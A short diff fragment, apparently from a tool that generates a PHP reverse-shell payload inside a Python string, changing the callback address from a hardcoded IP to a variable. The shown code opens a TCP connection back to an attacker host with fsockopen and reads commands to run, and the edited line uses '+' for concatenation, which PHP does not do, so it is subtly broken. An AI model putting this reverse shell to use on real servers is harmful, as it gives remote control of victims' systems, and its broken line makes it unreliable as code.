@@ -90,7 +90,7 @@ php = '''
     }
     $nofuncs='no exec functions';
     if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
-      $s=@fsockopen("tcp://10.11.0.178",$port);
+      $s=@fsockopen("tcp://"+$ipaddr,$port);
       while($c=fread($s,2048)){
         $out = '';
         if(substr($c,0,3) == 'cd '){
